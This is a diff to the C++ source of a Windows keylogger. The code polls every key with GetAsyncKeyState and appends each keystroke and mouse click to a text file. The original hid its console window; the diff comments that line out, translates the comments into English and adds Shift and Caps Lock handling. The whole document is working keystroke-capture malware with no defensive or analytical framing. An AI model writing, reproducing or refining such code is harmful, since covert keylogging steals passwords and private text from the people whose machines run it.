@@ -1,69 +1,98 @@
 #include <iostream>
 #include <Windows.h>
+#include <string.h>
+#include <fstream>
 using namespace std;
 
-//Disable warning-a
+ofstream myFile;
+
+//disable warning
 #pragma warning (disable : 4996)
 
-//sprema karakter u file
+//saving a new character in a file, default: project folder
 int Save(int _key, char *file);
 
+//checks if shift is pressed
+bool isShift();
+
 int main() {
-	//sakrivanje konzole
+
+	//increase value == more precision and less mistakes while getting input characters, but higher CPU usage and slower PC
+	//decrease value == just opposite
+	int checkKeyboardEveryNMiliseconds = 10;
+
+	//result file location, you can change this if needed
+	char* textFilePath = "text.txt";
+
+	//hiding console window
 	auto myConsole = GetConsoleWindow();
-	ShowWindow(myConsole, 0);
+	//ShowWindow(myConsole, 0);
+	
+	myFile.open("text.txt", fstream::app);
+
 	char i;
 	while (true)
 	{
-		Sleep(10);//za smanjenu aktivnost cpu-a
+		Sleep(checkKeyboardEveryNMiliseconds);
 		for (i = 8; i <= 255; i++)
 		{
-			//ako je button pritisnut
+			//if button is pressed
 			if (GetAsyncKeyState(i) == -32767) {
-				//fajl se sprema na istom mjestu gdje se nalazi .exe file
-				//po potrebi promijeniti
-				Save(i, "tekst.txt");
+				Save(i, textFilePath);
 			}
 		}
 	}
 	return 0;
 }
 
+bool isShift() {
+	if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
+		return true;
+	else
+		return false;
+}
+
 int Save(int _key, char *file) {
 	cout << _key << endl;
-	Sleep(10);//smanjena vrijednost cpu-a
-	FILE *OUTPUT_FILE;
+	Sleep(10);
 
-	OUTPUT_FILE = fopen(file, "a+");
-	//Dodavanje specijalnih karaktera
-	//Po potrebi dodati nove if-ove
-	if (_key == VK_SHIFT)
+	//adding special characters
+	//you can add new characters if needed
+	if (_key == VK_CAPITAL) {
+		myFile << "[CAPITAL]";
+	}
+	 if (_key == VK_SHIFT)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+		 myFile << "[SHIFT]";
 	}
 	else if (_key == VK_BACK)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[BACK]");
+		myFile << "[BACKSPACE]";
 	}
 	else if (_key == VK_LBUTTON)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
+		myFile << "[MOUSE_LEFT_BUTTON]";
 	}
 	else if (_key == VK_RBUTTON)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
+		myFile << "[MOUSE_RIGHT_BUTTON]";
 	}
 	else if (_key == VK_RETURN)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
+		myFile << "[ENTER]";
 	}
 	else if (_key == VK_ESCAPE)
 	{
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		myFile << "[ESCAPE]";
 	}
-	else
-		fprintf(OUTPUT_FILE, "%s", &_key);
-	fprintf(OUTPUT_FILE, "%s", "\n");//dodavanje novog reda nakon svakog karaktera
-	fclose(OUTPUT_FILE);
+	else {
+		if (isShift())
+			myFile << char(_key);
+		else {
+			char c = tolower(_key);
+			myFile << c;
+		}
+	}
+	
 	return 0;
 }
